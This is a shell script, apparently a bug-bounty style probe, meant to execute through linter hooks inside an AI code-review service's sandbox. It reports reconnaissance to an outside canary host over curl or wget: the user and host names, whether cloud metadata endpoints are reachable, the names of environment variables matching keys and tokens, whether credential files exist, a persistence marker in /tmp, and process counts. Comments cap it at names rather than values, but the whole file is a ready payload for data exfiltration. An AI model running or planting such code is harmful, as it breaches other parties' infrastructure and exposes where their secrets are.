#!/bin/sh
# CodeRabbit Batch 1 — sandbox boundary probe. Repo tes sendiri ONLY.
#
# MELAPORKAN HANYA: boolean, hitungan, dan NAMA env var (bukan nilainya).
# TIDAK PERNAH mengirim isi secret/token apa pun ke canary.
# Bila probe menunjukkan secret produksi ada (meta=1 / envnames berisi nama
# sensitif / gitcred=1), BERHENTI — jangan ambil nilainya, laporkan segera.
#
# Usage: sh probe.sh <canary-host> <tool-tag>
#   canary-host: webhook.site/<uuid>  ATAU  <random>.oast.pro
#   tool-tag:    phpstan-autoload | phpstan-composer | luacheck | mdlint
CANARY="$1"
TOOL="$2"
[ -z "$CANARY" ] && exit 0
[ -z "$TOOL" ] && TOOL=unknown

ping() { # $1 = path + query string
  curl -s --max-time 5 "https://${CANARY}$1" >/dev/null 2>&1 || \
    wget -q -T 5 -O /dev/null "https://${CANARY}$1" >/dev/null 2>&1 || true
}

U=$(id -un 2>/dev/null || echo unknown)
H=$(hostname 2>/dev/null || echo unknown)

# --- Tahap 1: bukti eksekusi kode ---
ping "/${TOOL}?stage=exec&u=${U}&h=${H}"

# --- Tahap 2: probing batas sandbox (boolean / hitungan / nama saja) ---

# 2a. GCP metadata server — UJI JANGKAUAN SAJA via endpoint non-sensitif
# (/instance/hostname). JANGAN PERNAH mengambil token service account.
META=0
if curl -s --max-time 3 -o /dev/null -w "%{http_code}" \
     -H "Metadata-Flavor: Google" \
     "http://169.254.169.254/computeMetadata/v1/instance/hostname" 2>/dev/null \
     | grep -q "200"; then
  META=1
fi

# 2b. Hostname internal GCP (seharusnya tidak resolve dari sandbox).
INT=0
if curl -s --max-time 3 -o /dev/null "http://metadata.google.internal/" 2>/dev/null; then
  INT=1
fi

# 2c. Metadata AWS (seharusnya 0 — sandbox di GCP; 1 = anomali).
AWSM=0
if curl -s --max-time 2 -o /dev/null "http://169.254.170.2/latest/meta-data/" 2>/dev/null; then
  AWSM=1
fi

# 2d. NAMA env var yang cocok pola sensitif (NAMA SAJA, tanpa nilai).
ENVNAMES=$(env 2>/dev/null | cut -d= -f1 | grep -iE "API_KEY|SECRET|TOKEN|PASSWD|PASSWORD|PRIVATE|AWS_|GITHUB_|ANTHROPIC|OPENAI|CREDENTIAL" | paste -sd, - 2>/dev/null)
ENVCOUNT=0
if [ -n "$ENVNAMES" ]; then
  ENVCOUNT=$(printf '%s' "$ENVNAMES" | tr ',' '\n' | wc -l | tr -d ' ')
fi
ENVALL=$(env 2>/dev/null | wc -l | tr -d ' ')

# 2e. File kredensial — KEBERADAAN SAJA, isinya tidak dibaca.
GITCRED=0; [ -f "$HOME/.git-credentials" ] && GITCRED=1
GHCLI=0; [ -f "$HOME/.config/gh/hosts.yml" ] && GHCLI=1
GITCFG=0
if [ -f .git/config ] && grep -qiE "token" .git/config 2>/dev/null; then
  GITCFG=1
fi

# 2f. Persistensi antar-review — marker MILIK SENDIRI saja (pola cr-batch1-*).
#     Jangan pernah me-list isi /tmp milik review lain.
PREV=0
ls /tmp/cr-batch1-* >/dev/null 2>&1 && PREV=1
date -u +%FT%TZ > "/tmp/cr-batch1-${TOOL}" 2>/dev/null || true
TMPCOUNT=$(ls /tmp 2>/dev/null | wc -l | tr -d ' ')

# 2g. Proses & privilege (hitungan saja).
PSN=$(ps -e 2>/dev/null | wc -l | tr -d ' ')
IDSTR=$(id -u 2>/dev/null || echo "?")

ping "/${TOOL}?stage=probe&meta=${META}&int=${INT}&awsmeta=${AWSM}&envcount=${ENVCOUNT}&envall=${ENVALL}&envnames=${ENVNAMES}&gitcred=${GITCRED}&ghcli=${GHCLI}&gitcfg=${GITCFG}&prev=${PREV}&tmpcount=${TMPCOUNT}&ps=${PSN}&uid=${IDSTR}"
